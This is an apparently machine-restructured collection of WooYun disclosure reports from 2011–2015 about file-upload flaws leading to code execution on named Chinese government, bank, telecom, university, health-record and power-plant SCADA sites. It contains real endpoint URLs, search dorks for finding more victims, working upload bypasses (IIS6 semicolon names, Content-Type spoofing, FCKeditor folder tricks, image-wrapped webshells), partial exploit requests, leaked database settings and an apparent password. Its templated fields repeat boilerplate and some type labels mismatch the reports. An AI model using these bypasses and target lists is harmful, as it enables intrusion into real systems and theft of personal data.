**详情**: trs 上传漏洞获取到服务器权限后查看root的history发现mount了主站

**POC**: 上传pocPOST http://wcm.fmprc.gov.cn/wcm/services/trs:templateservicefacade HTTP/1.0SOAPAction: ""Content-Type: text/xml<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:x

**绕过**: 直接利用

**修复**: trs厂商的效率太低，不重视用户完全，建议有关部门督促其整改。另外据了解很多trs系统部署的时候权限太高，所以对服务器安全影响很大。如非业务需要，就不要把主站挂载到该服务器。
---

---
### [wooyun-2011-02430] dotnot编辑器的一些BUG
**厂商**: 中华网工作室 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.  IIS6.0+03  直接传x.asp;x.jpg　　　也可建X.ASP文件夹2.　如果上传目录没有执行权限，再次利用重命名功能可以，重命名名字加上 ../　　可以实现文件移动到上级目录，这样就可以突破上传目录没执行权限问题3.　文件上传处有个高级设置，可以自定义上传格式，如果disable，可以自己用chrome把disable去掉，JS控制的。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 新版本已经修复了，老版本好像没找到关于类的版本号说明,所以具体哪个版本不清楚-_-
---

---
### [wooyun-2015-0114100] 翼机通省平台另一站点存在任意文件上传漏洞
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在之前提交的翼机通省平台漏洞中，有一个链接，地址是http://125.88.109.71/login.jspx，这是一个存放历史数据的平台帐号与http://14.146.224.121/login.jspx不通用但系统是一样的，我就想试试上传点是否有做权限控制

**POC**: 将之前漏洞的数据包ip地址替换POST http://125.88.109.71/datamgr/imageupload!upload.jspx HTTP/1.1Host: 125.88.109.71Connection: keep-aliveContent-Length: 10383Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://125.88.109.71User-Agent: Mozilla/5.0

**绕过**: 直接利用

**修复**: 控制权限，上传点过滤
---

---
### [wooyun-2014-074913] 某通用程序文件上传导致任意代码执行·续篇（影响全国各省）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 继续挖掘之前发布过的漏洞WooYun: 某通用程序任意目录遍历及文件上传导致任意代码执行（影响全国各省）发现其他两处任意文件上传点--------------------------------------------------------百度dork: inurl:/ycportal影响范围：全国各省市地区烟草专卖局及少数GOV站点--------------------------------------------------------0x00:测试文件内容<%out.print("just4test....From WooYun.Org");%>0x01:第一处上传点说明：这里没什么可说的，直接打开页面 ycportal/jsp/forupload.jsp，上传jsp文件即可。访问路径为 upload/images/itemimage/null.jsp案例：http://www

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: @cncert国家互联网应急中心 没有查到相关厂商具体信息，不过在根目录下有个install.jsp文件，发邮件获取license的，可以研究一下那个文件，看能不能找到 相关厂商的信息。
---

---
### [wooyun-2014-054030] 蜘蛛网某服务器配置不当导致沦陷
**厂商**: spider.com.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 蜘蛛网电影分站jboss服务器配置不当导致沦陷漏洞地址：http://test.spider.com.cn:8060/jmx-console/漏洞利用过程如下：看看是什么权限用户C盘的内容

**POC**: 漏洞证明

**绕过**: 直接利用

**修复**: 测试数据已经删除，请管理员及时修补漏洞
---

---
### [wooyun-2012-04034] 中国移动天津10086很好玩啊= =
**厂商**: 中国移动 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站是JSP+linux的架构存在本地上传漏洞，通过构造本地上传页面可以传任意文件，本地上传的构造页面：上传jsp网马之后直接查权限是root用NC反弹回本地：这个版本都脚本可以提权，就算不是直接root，也可以提权了。网站的种种目录虽然是限制权限了，但是给予的服务器权限太高了，另外就是上传要限制一下才行，看了一下整个服务器，还是挺多东西的，10086，12530，Wireless等等。所以安全还是重视点好。由于这个之前已经提交给移动了，漏洞也修好了，发出来要点积分吧....(╯﹏╰)（@shine，我也觉的wooyun的图片上传太难受了..）

**POC**: (╯﹏╰)

**绕过**: 直接利用

**修复**: (╯﹏╰)
---

---
### [wooyun-2013-047421] 某通用型IT管控系统存在任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前大牛发的洞：WooYun: 4R-IT管控系统存在通用性远程代码执行上一个漏洞任意文件下载的漏洞：WooYun: 某通用型IT管控系统存在任意文件下载漏洞这次还有一个点可以直接上传任意类型的文件

**POC**: 漏洞点：http://4r.xinjingxiang.com/common/upload.jsp部分情况下可以直接上传并且回显路径：此时可以直接用菜刀连接：如果上传JSP文件出现错误，如下图：我们可以用简单的猜解的方法第一个页面放一张正常的jpg图片，第二个页面放我们的jsp文件先上传一个正常的jpg图片，然后马上去上传第二个页面的jsp文件，如果发现上传按钮点不了，就直接点路径那，然后回车就好。然后马上去看正常的jpg图片的文件名：http://119.145.128.106:88https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload//1

**绕过**: 直接利用

**修复**: 限制上传文件的类型
---

---
### [wooyun-2013-037060] 代码审计系列1:abcEditor ABC编辑器 utf-8 v2013.09 文件上传绕过
**厂商**: abcEditor | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个轻编辑器只有三个文件，唯一的PHP文件(abcedit.php)的功能就是上传.我们来看看这个abcedit.php里面有哪些代码：我们可以看见代码不多，文件后缀验证代码很仓促。很明显只验证头信息是非常错误的。我们看看如何绕过这个验证1.打开上传页面这里要普及一下PHP知识。我们知道$_FILES["file"]["type"]获取的是头信息中的Content-Type如果我们篡改Content-Type会如何呢？2.抓包修改Content-Type从代码可以看出程序员只对以下后缀通过：//判断文件类型和大小if((($_FILES["file"]["type"] == "image/gif")||($_FILES["file"]["type"] == "image/jpeg")||($_FILES["file"]["type"] == "image/pjpeg")||($_FILES

**POC**: OK，修改提交之后。PIC目录静静的躺着一个txt文件

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2013-018985] 住哪网某站点高危漏洞可被入侵
**厂商**: 住哪网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 住哪联盟 FCK编辑器文件上传漏洞可致站点沦陷！http://union.zhuna.cn/question/master/FCKeditor/editor/filemanager/connectors/test.html直接上传asp一句话文件test.asp;.jpg，发现上传成功后的文件后缀变成了.asp;“菜刀”连接之：点到为止，未进一步深入...

**POC**: 另：广告内容管理后台无需登录可直接访问（建议进行认证）：http://union.zhuna.cn/systemmanager/根目录下多个压缩文件可被直接下载(建议删除)：

**绕过**: 直接利用

**修复**: 升级新版本(如非必须建议删除)!
---

---
### [wooyun-2014-059257] 汉远网智主站任意文件上传
**厂商**: 汉远网智信息技术有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.chinanetwork.com.cn/w8/pages/sys/annone.aspx?id=32bf330e-f925-4336-a625-68bd5dffc80b右侧添加附件可上传任意文件，用fiddler抓服务器响应包就可以获取到上传文件路径

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 程序猿懂的
---

---
### [wooyun-2014-047604] 智源公文管理系统任意文件上传漏洞
**厂商**: 智源工作室 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.zycms.cn/zf/upfile.asp此为演示站点的上传脚本路径，未做任何过滤与访问验证，用神器明小子直接UP了一个asp文件。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加上文件过滤跟访问验证啊
---

---
### [wooyun-2015-0164908] 人保寿险某系统漏洞打包泄漏大量用户信息（任意文件上传、未授权访问、目录浏览、数据库下载）
**厂商**: 人保寿险 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://pl-lf.gicp.net:3535/picclife.asp先来个未授权访问http://pl-lf.gicp.net:3535/1111.asp大量保单关键是可以按日期查询把时间间隔拉到2008年1月1日2663页，每页50条2663*50=133150条记录

**POC**: 2#目录浏览权限未关http://pl-lf.gicp.net:3535/inc/http://pl-lf.gicp.net:3535https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/http://pl-lf.gicp.net:3535/images/3#文件上传http://pl-lf.gicp.net:3535/upload.asp我是直接抓包改后缀上传路径在http://pl-lf.gicp.net:3535https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/wooyun.a

**绕过**: 直接利用

**修复**: 问题太多 ，下线，整改
---

---
### [wooyun-2015-0107158] 某高校门户信息系统任意文件上传导致代码执行之二
**厂商**: 南软科技 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 南京南软开发的一套专门用于高校门户信息系统的CMS存在任意文件上传漏洞，可导致上传任意文件。Upload bug:/web_admin/ftb.imagegallery.aspx  上传伪装的图片文件可导致任意文件上传互联网自动采集案例5枚：http://gschool.hebmu.edu.cn/web_admin/ftb.imagegallery.aspxhttp://yjs.xzmc.edu.cn/web_admin/ftb.imagegallery.aspxhttp://yjshb.depart.hebust.edu.cn/web_admin/ftb.imagegallery.aspxhttp://gr.besti.edu.cn/web_admin/ftb.imagegallery.aspxhttp://yjs.cdutcm.edu.cn/web_admin/ftb.imagegal

**POC**: 以其中一个案例进行漏洞安全测试，此漏洞危害非常大，请不要模仿下面方法进行非法入侵，否则后果自负！上传一个图片二进制形式合成的shell，如果该伪装的shell不是图片合成的，可能会提示”内存不足“，选择为jpg格式上传，上传的时候拦截数据包。拦截数据包修改文件的后缀名提交之后便返回了文件名：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-030731] 某市银行网站存在严重的上传漏洞导致全站沦陷
**厂商**: 某市银行 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 资阳某银行网站存在严重的编辑器漏洞 再加上存在IIS6解析漏洞 导致上传图片马  直接沦陷全站  权限强大 客户信息可能容易泄漏 还是银行这种特殊的网站 谢绝查水表哦http://www.yjrcb.cn/fckeditor/editor/fckeditor.html

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你比我们专业
---

---
### [wooyun-2014-066357] 某政务信息门户系统通用任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 开发公司： 黑龙江海康软件工程有限公司 （http://www.highcom.com.cn）程序名称： 海康政务信息门户系统（GIP）漏洞类型： 任意文件上传漏洞文件： gip/FCKeditor/editor/filemanager/browser/default/browser.html是否需要登录： 不需要利用方式：直接上传jsp木马，无任何限制影响版本：GIP4、GIP4.5、GIP4.6 通杀关键字：google: intitle:GIP4 inurl:gipinurl:/gip/app/影响用户：http://www.hlsafety.gov.cn:8080/gip/FCKeditor/editor/filemanager/browser/default/browser.html?webSiteName=drbt&webSiteId=40287d4619c5fc0c0119c

**POC**: 实例演示：###1：http://www.hlsafety.gov.cn:8080/gip/FCKeditor/editor/filemanager/browser/default/browser.html?webSiteName=drbt&webSiteId=40287d4619c5fc0c0119c60a6de50001&Type=Image&Connector=connectors/jsp/connector###2:黑龙江老干部活动中心http://www.hljelder.com:8001/gip/FCKeditor/editor/filemanager/browser/defaul

**绕过**: 直接利用

**修复**: 换编辑器，或者改造一下
---

---
### [wooyun-2015-095548] 郑州教育博客被菠菜/大量教师信息泄露
**厂商**: 郑州教育 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 知道你们的管理已经删除了比较明显的木马和菠菜文件但是没有删除的呢  如下 百度搜索site:blog.zzedu.net.cn 娱乐城根据百度快照时间，可以推算出网站被入侵的大概时间是在2014-9月----2014-10月之间入侵的方式FCK上传和网站功能缺陷

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 网站存在的问题比较多，但是主要问题存在于网站的上传和功能设置上，另外教师的信息请妥善保管，如果你都不能妥善保管，又何必让他们填写那么详细的信息呢？修复方案：网站补丁升级、好歹给网站加个防火墙吧----你们公司不缺这点钱，服务器装个杀毒什么的，至于现在网站报风险提示，解决方案很简单，等你们网站把非法信
---

---
### [wooyun-2013-040073] 江苏国泰新点软件公共资源电子招投标管理系统可上传可执行脚本（NO.2）
**厂商**: 江苏国泰新点软件有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站信息发布处存在不严格的过滤上传，利用账户密码登陆管理后台上传ASPX脚本执行。

**POC**: 登陆http://ztb.epoint.com.cn:8090/bzbztb5_Demo/login_usb.aspx用户名admin密码11111进入保存为草稿箱使用burpsuite拦截修改cc.aspx.jpg为cc.aspx即可最后上shell我发现好多没有过滤的地方啊。

**绕过**: 直接利用

**修复**: 通用过滤，不要发现一处补一处。
---

---
### [wooyun-2015-0151565] 禅道项目管理软件任意文件写入漏洞（需要登录）
**厂商**: 禅道 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ## 漏洞触发条件需要登录## 漏洞影响范围开源版 7.3,专业版4.7.1 以及之前版本## 漏洞代码分析关键代码在`\module\file\model.php`，252-276行。/*** Paste image in kindeditor at firefox and chrome.** @param  string    $data* @access public* @return string*/public function pasteImage($data){$data = str_replace('\"', '"', $data);ini_set('pcre.backtrack_limit', strlen($data));preg_match_all('/<img src="(data:image\/(\S+);base64,(\S+))".*\/>/U', $data

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 写的时候，检验下文件的后缀。
---

---
### [wooyun-2011-03502] easySite内容管理系统FCKeditor上传任意类型文件
**厂商**: 中科汇联 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-042614] 党报旗下某活动发布服务器ST2导致服务器沦陷
**厂商**: 人民日报 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先证明服务器是人民日报的：菊花：讲文明树新风活动：http://www.peoplecity.cn/pmgyggds/index.action绚丽甘肃活动：http://www.peoplecity.cn/pmgssyds/index.action

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0125872] 安徽省多地区居民健康档案系统通用上传漏洞(影响多地市居民信息)
**厂商**: 合肥晶奇电子科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传漏洞：**.**.**.**:9099/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx可以直接上传，并利用二次上传漏洞构造双拓展名传马：**.**.**.**:8088/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx

**POC**: 多个市政府用这个系统，影响的肯定不止一个系统：GETSHELL事例：**.**.**.**:9099/imageshttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/image/1.asp;(1).gif这种系统一旦出现高危漏洞影响的可就是整个政府部门所有内部系统了。。。这几个G级别的数据库村的可都是全市人民的信息。其他例子：**.**.**.**:9099/**.**.**.**:9099/Login.aspx**.**.**.**:8088**.**.**.**:9099/**.**.**.**:9099/http://**.**.*

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2011-02498] 4399任意文件上传漏洞
**厂商**: 4399小游戏 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.上传时表单提交只做了JS验证(FireBUG改下就绕过了)2.上传文件加入GIF头后直接上传为PHP的文件(不知道是否有做mime.type验证)

**POC**: http://news.4399.com/show/index.php?s=showme登录状态下..

**绕过**: 过滤绕过

**修复**: 你懂的...
---

---
### [wooyun-2015-0114070] 淮北市司法局任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 淮北市司法局任意文件上传漏洞

**POC**: http://www.hbpfw.gov.cn/admin/module/3/file.php?filename=CPTP&id=79可惜是上传到另外一个服务器上

**绕过**: 直接利用

**修复**: 你们懂得~~
---

---
### [wooyun-2015-0142603]  某省交通运输厅任意文件上传
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/上传点 http://**.**.**.**/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0上传后http://**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/201509211711274543

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0105652] 某特种设备管理平台任意文件上传，影响全国众多省份地区
**厂商**: 上海君睿信息技术有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：上海君睿信息技术有限公司系统名称：特种设备作业人员管理平台漏洞问题：文件上传漏洞文件：dwbm_kzbm.do（特种设备作业人员考核申请表）关键字：技术支持：上海君睿信息技术有限公司根据搜索引擎，列举部分不完全案例如下：江苏省特种设备管理平台：http://www.jstsks.com/index.shtml湖南省特种设备管理平台：http://www.hntskh.com/index.shtml安徽省特种设备管理平台：http://www.ahtsks.com/index.shtml四川省特种设备管理平台：http://www.sctzsbzy.com/default.shtml海南省特种设备管理平台：http://www.hntsks.com/index.shtml贵州省特种设备管理平台：http://www.gztsks.com/index.shtml吉林省特种设备管理平台：h

**POC**: 漏洞证明：贵州省特种设备管理平台：http://www.gztsks.com/index.shtml为例：http://www.gztsks.com/dwbm_kzbm.do头像上传处过滤存在缺陷。。POST /uploadksimg.do?suffix=jpg&filename=files HTTP/1.1Host: www.gztsks.comProxy-Connection: keep-aliveContent-Length: 2507Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/x

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2014-047607] 优酷某分站继上一次上传重新杀入phpmyadmin（数据库口令泄露）
**厂商**: 优酷 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本因前天提交的，后来发现网站换了，继上一次上传，且收集的内裤信息重新杀入phpmyadmin，挺多内裤了上次挖到但木有时间去弄，所以丢了权限都不知道。

**POC**: $this->host="192.×.×.13"$this->port="3306"$this->username="201××"$this->password="201××"$this->dbname="201××";define('DB_SERVERNAME', 'localhost');define('DB_USERNAME', 'root');define('DB_PASSWORD', 'yhnj××')define('DB_DBNAME', 'api××');<?phpdefine("BC_HOST", "××.youku.com");define("BC_IP", "10.×.×.

**绕过**: 直接利用

**修复**: 禁止phpmyadmin外部访问或删除phpmyadmin，修改泄漏的密码
---

---
### [wooyun-2015-0105704] 江西中医药大学教务管理系统存在漏洞补充
**厂商**: 江西中医药大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次没有通过http://www.wooyun.org/bugs/wooyun-2010-0105508/trace/9c949f564ded401dd228377c516ce91e这次上传图片 上次忘记了 不会意思 不会重复了吗正方教务管理系统 jwgl.jxtcmi.comhttp://www.jxutcm.edu.cn/ 江西中医药大学 |jwgl.jxtcmi.com存在fck 证明看图片

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 邀请码
---

---
### [wooyun-2014-058026] 某电厂scada系统存在任意文件上传执行漏洞
**厂商**: 南京科远 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，可越权访问上传系统提示声音的asp页面。2，仅对mp3扩展名进行了过滤，会被很轻松绕过。3，没有对该mp3存放目录进行执行权限限制。4，对iis、asp的权限没有做限制，可以对c、d等多个盘符进行访问，如果没猜错甚至其他不用提权，即可进行更深入的工作（怕影响电厂生产，没有继续渗透）。2月份发现的这个低级漏洞，竟然一直没有修复，深深的对该电厂感到忧虑。

**POC**: 漏洞页面，如上图。上传文件，如上图。上传成功，如上图。执行成功，任意盘符浏览，如上图。。。看图，危害性应该不用我多说了。赶快修复这个低级漏洞吧，不然该电厂太危险了。

**绕过**: 过滤绕过

**修复**: iis权限设置。代码审计。文件目录权限设置。
---

---
### [wooyun-2013-025563] 河南省某地级市人力资源和社会保障局fekedit上传漏洞
**厂商**: 三门峡市人力资源和社会保障局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到人社局的网站有fckedit，于是试了试，前面测试了很多次，没有成功，感觉网上介绍的方法没法上传。首先：上传word、图片之类的可以，但是ASP，asa、aspx都不行，文件名中加点也不行，最后用上传文件夹名为1.asp，它会被改名为1_asp,成下划线了，也不行，都快要放弃时想想修改参数试试，结果成功了。修改的参数：http://www.hasmx.hrss.gov.cn//FckEditor/editor/filemanager/connectors/aspx/connector.aspx?Command=CreateFolder&Type=File&CurrentFolder=/a.asp&NewFolderName=z&uuid=1369647267562

**POC**: 详细说明已经有了

**绕过**: 直接利用

**修复**: 杀毒，找到shell,可能有其他人上传；把fckedit删除吧，看过太多的fckedit悲剧。
---

---
### [wooyun-2015-0150201] 成都大学档案管理站越权操作/任意文件上传
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/upload.php?Type=   成都大学档案馆 上传漏洞http://**.**.**.**/updatesn.php  成都大学计财处越权操作可以更改管理员账户密码jcc 1988zxl113

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 权限控制好吧
---

---
### [wooyun-2015-0162831] 某交友网站任意文件上传漏洞
**厂商**: 北京兴赛客网络科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可通过上传头像执行PHP脚本(浏览代码，修改代码，脱库)

**POC**: 访问 http://www.saike.com/cciceimage/adpg/20151219085558_152.jpg/.php 发现其头部信息为X-Powered-By:PHP/5.2.13

**绕过**: 直接利用

**修复**: 修改nginx配置
---

---
### [wooyun-2013-044524] 联通某省分站任意上传漏洞可导致服务器沦陷
**厂商**: 中国联通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对上传目录限制脚本权限啊。
---

---
### [wooyun-2013-037458] 经纬中天-访谈直播应用管理系统任意文件上传漏洞
**厂商**: 北京经纬中天信息技术有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在问题的页面：BVvisit20\Tomcat-5.5_v5.0\webapps\ivss\web\jwzt\service09\meetingRoom\upload_img.jsp该页面尽管是管理功能页面但是没有权限验证，可以直接访问。比如：http://cftv.forestry.gov.cn:8080/ivss/web/jwzt/service09/meetingRoom/upload_img.jsp这个系统不是太好找，在搜索引擎中搜索/ivss/web/jwzt可以找到一些例子。

**POC**: 以国家林业局为例：http://cftv.forestry.gov.cn:8080/ivss/web/jwzt/service09/meetingRoom/upload_img.jsp直接上传jsp脚本，提交以后在当前页查看源码就可以看到webshell的路径；上图中文件的时间是2012年，最近7月29和30日也有一兄弟在利用这个上传问题。

**绕过**: 直接利用

